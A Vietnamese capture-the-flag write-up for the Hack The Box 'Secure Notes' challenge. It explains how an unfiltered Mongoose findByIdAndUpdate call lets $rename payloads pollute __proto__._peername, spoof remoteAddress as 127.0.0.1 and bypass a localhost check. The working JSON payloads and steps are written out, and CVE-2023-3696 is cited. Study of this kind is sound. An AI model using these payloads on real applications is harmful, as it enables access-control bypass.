# Phân tích chi tiết bài Secure Notes - Hack The Box

## Link bài lab

**[Secure Notes](https://app.hackthebox.com/challenges/Secure%20Notes)**

---

## Tổng quan bài lab

Ứng dụng Secure Notes là một web app ghi chú đơn giản. Người dùng có thể tạo note, xem note và cập nhật note.

Ứng dụng được viết bằng Node.js, sử dụng Express và Mongoose để thao tác với MongoDB.

Luồng xử lý tổng quát:

```text id="wmp3wq"
Client
        ↓ gửi request HTTP
Express app: app.js
        ↓ thao tác dữ liệu
Mongoose
        ↓ lưu trữ
MongoDB: localhost:27017/app
```

Ứng dụng có endpoint /flag, nhưng endpoint này chỉ trả flag nếu request đến từ localhost.

Mục tiêu của bài là khai thác lỗi trong chức năng update note để bypass kiểm tra localhost ở /flag, từ đó lấy được flag.

---

## Reconnaissance

Khi truy cập ứng dụng, giao diện cho phép người dùng tạo và quản lý note.

Các endpoint chính có thể xác định được từ source code:

```text id="ec6fmu"
GET  /flag
POST /create
GET  /get/:noteId
POST /update
```
Trong đó:

* /create: tạo note mới.
* /get/:noteId: lấy note theo ID.
* /update: cập nhật note.
* /flag: trả flag nếu request đến từ localhost.

Endpoint đáng chú ý nhất là:

```text id="bxzmm1"
/flag
```
Khi truy cập từ bên ngoài, endpoint này trả về lỗi:

```json id="e9khb8"
{
  "Message": "Access denied"
}
```
Điều này cho thấy /flag có cơ chế giới hạn truy cập dựa trên địa chỉ IP nguồn.

---

## Phân tích database

Ứng dụng kết nối tới MongoDB local:

```js id="f159my"
const uri = 'mongodb://localhost:27017/app';
await mongoose.connect(uri);
```
Ứng dụng định nghĩa model Note như sau:

```js id="lq4eb5"
const Note = mongoose.model('Note', new mongoose.Schema({
    title: String,
    content: String,
}));
```
Như vậy, mỗi note có hai field chính:

```text id="lpft5m"
title
content
```
Mục đích ban đầu của ứng dụng là chỉ cho phép người dùng lưu tiêu đề và nội dung ghi chú.

Tuy nhiên, lỗ hổng xuất hiện ở endpoint /update, khi toàn bộ request body được truyền trực tiếp vào hàm update của Mongoose.

---

## Phân tích endpoint /flag

Endpoint /flag có đoạn code:

```js id="gtbufl"
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```
Endpoint này lấy địa chỉ IP nguồn từ:

```js id="j8zy1i"
req.connection.remoteAddress
```
Sau đó so sánh với các giá trị localhost:

```text id="uxuxam"
127.0.0.1
::1
::ffff:127.0.0.1
```
Nếu giá trị remoteAddress là một trong các địa chỉ trên, server trả flag.

Nếu không, server trả:

```json id="cwpc3j"
{
  "Message": "Access denied"
}
```
Điều này cho thấy cơ chế bảo vệ /flag chỉ dựa trên việc kiểm tra địa chỉ IP nguồn.

---

## Phân tích endpoint /create

Endpoint /create có đoạn code:

```js id="nlwk2y"
app.post('/create', async (req, res) => {
    try {
        const { title, content } = req.body;
        if (typeof title !== 'string' || typeof content !== 'string') {
            res.status(400).json({ Message: 'Invalid title or content' });
            return;
        }
        const note = new Note({
            title,
            content,
        });
        await note.save();
        res.json(note);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```
Endpoint này nhận hai tham số:

text id="o85efw"
title
content

Ứng dụng có kiểm tra kiểu dữ liệu:

```js id="z2tbw8"
if (typeof title !== 'string' || typeof content !== 'string')
```
Vì vậy, ở /create, attacker chỉ có thể tạo note với title và content là string.

Endpoint này chưa phải vị trí khai thác chính, nhưng nó được dùng để tạo dữ liệu ban đầu phục vụ cho bước khai thác /update.

---

## Phân tích endpoint /get/:noteId

Endpoint /get/:noteId có đoạn code:

```js id="f82bud"
app.get('/get/:noteId', async (req, res) => {
    try {
        const noteId = req.params.noteId;
        let note = await Note.findOne({ _id: noteId });
        res.json(note);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```
Endpoint này nhận noteId từ URL path, sau đó tìm note theo _id.

Chức năng này có thể dùng để kiểm tra note đã được tạo hoặc cập nhật thành công hay chưa.

---

## Lỗ hổng: Prototype Pollution thông qua Mongoose update

### Phân tích endpoint /update

Endpoint /update có đoạn code:

```js id="e9e1gv"
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```
Dòng nguy hiểm nhất là:

```js id="n0xh98"
await Note.findByIdAndUpdate(noteId, req.body);
```
Ở đây, server truyền trực tiếp toàn bộ req.body vào `findByIdAndUpdate()`.

Điều này nguy hiểm vì người dùng không chỉ kiểm soát giá trị của title và content, mà còn có thể gửi các MongoDB update operator như:

```text id="v5tosy"
$set
$rename
$unset
```
Trong bài này, operator quan trọng là:

```text id="rvrnch"
$rename
```
### Vì sao $rename nguy hiểm?

MongoDB $rename cho phép đổi tên field trong document.

Ví dụ:

```json id="xomxt4"
{
  "$rename": {
    "title": "newTitle"
  }
}
```
sẽ đổi field:

```text id="cs84we"
title → newTitle
```
Nếu ứng dụng không kiểm soát đích rename, attacker có thể rename field sang những path nguy hiểm như:

```text id="y36d1b"
__proto__.xxx
```
Từ đó gây ra prototype pollution.

### Ý tưởng prototype pollution

JavaScript object có prototype chain. Khi một property không tồn tại trực tiếp trên object, JavaScript có thể tìm tiếp ở prototype.

Nếu attacker có thể ghi dữ liệu vào:

```text id="fb8mag"
__proto__
```
thì các object khác có thể bị ảnh hưởng khi truy cập property tương ứng.

Trong challenge này, mục tiêu là làm ảnh hưởng tới thông tin địa chỉ kết nối để endpoint /flag hiểu nhầm request đến từ localhost.

---

## Chuỗi khai thác

Chuỗi khai thác tổng quát:

```text id="u1eb0o"
Tạo note hợp lệ
        ↓
Dùng /update với $rename
        ↓
Rename title/content sang __proto__._peername.*
        ↓
Prototype bị pollution
        ↓
req.connection.remoteAddress bị ảnh hưởng
        ↓
Gọi /flag
        ↓
Lấy flag
```
---

## Các bước khai thác

### Bước 1: Tạo note mới

Đầu tiên tạo một note có title và content là các giá trị cần pollute.

Payload:

```json
{
    "title":"127.0.0.1",
    "content":"IPv4"
}
```

Response sẽ trả về note vừa tạo, trong đó có _id.

Ví dụ:

```json id="k8dy7k"
{
    "title":"127.0.0.1",
    "content":"IPv4",
    "_id":"6a2bb041036b788ead5001be",
    "__v":0
}
```
Lưu lại giá trị _id:

```text id="ft2jkf"
6a2bb041036b788ead5001be
```
---

### Bước 2: Rename title sang __proto__._peername.address

Tiếp theo, dùng endpoint /update với operator $rename.

Payload:
```json
{
    "noteId":"6a2bb041036b788ead5001be",
    "$rename": {
        "title": "__proto__._peername.address"
    }
}
```
Mục đích:

```text id="pv58j1"
title = "127.0.0.1"
        ↓ $rename
__proto__._peername.address = "127.0.0.1"
```
Giá trị 127.0.0.1 được dùng để giả lập địa chỉ localhost.

---

### Bước 3: Rename content sang __proto__._peername.family

Tiếp tục dùng $rename với field content.

Payload:
```json
{
    "noteId":"6a2bb041036b788ead5001be",
    "$rename": {
        "content": "__proto__._peername.family"
    }
}
```

Mục đích:

```text id="v41kfc"
content = "IPv4"
          ↓ $rename
__proto__._peername.family = "IPv4"
```
Sau bước này, prototype đã có dữ liệu liên quan đến _peername.

---

### Bước 4: Gọi endpoint /flag

Sau khi prototype pollution thành công, gọi:
```text
/flag
```
Server sẽ trả về flag:

```text id="tzngzt"
HTB{m0ng00s3_pr0t0typ3_p0llus10n_c0mb1n3d_w1th_1nt3rn4l_n0d3_g4dg3ts!}
```
---

## Vì sao có thể bypass /flag?

Endpoint /flag kiểm tra:

```js id="sxdftk"
const remoteAddress = req.connection.remoteAddress;
```
Trong Node.js, thông tin remoteAddress của connection có liên quan tới thông tin peer/socket.
```text
req.connection
    ↓
socket object
    ↓
remoteAddress getter
    ↓
đọc thông tin peer/socket
    ↓
_peername.address
```

Khi attacker pollute được prototype path liên quan đến:

```text id="pdzx4r"
_peername.address
_peername.family
```
ứng dụng có thể đọc ra giá trị địa chỉ đã bị attacker kiểm soát.

Kết quả là remoteAddress có thể trở thành:

```text id="mi7f8g"
127.0.0.1
```
Khi đó điều kiện trong /flag được thỏa mãn:

```js id="yv5dtr"
remoteAddress === '127.0.0.1'
```
và server trả flag.

---

## Tóm tắt exploit chain

Chuỗi khai thác gồm các bước:

```text id="dcj4fp"
Unsafe Mongoose update
        ↓
User kiểm soát MongoDB update operator
        ↓
Dùng $rename
        ↓
Đổi title/content sang __proto__._peername.*
        ↓
Prototype pollution
        ↓
Làm remoteAddress trở thành 127.0.0.1
        ↓
Bypass localhost check
        ↓
Truy cập /flag
        ↓
Lấy flag
```
---

## Root cause

Có ba nguyên nhân chính dẫn đến lỗ hổng.

1. Truyền trực tiếp req.body vào Mongoose update

    Dòng code nguy hiểm:

    ```js id="zfk9ci"
    await Note.findByIdAndUpdate(noteId, req.body);
    ```
    Server không lọc dữ liệu đầu vào trước khi update.
2. Dependence vulnerable: 
    ```text
    mongoose 7.2.4 bị prototype pollution CVE-2023-3696
    ```
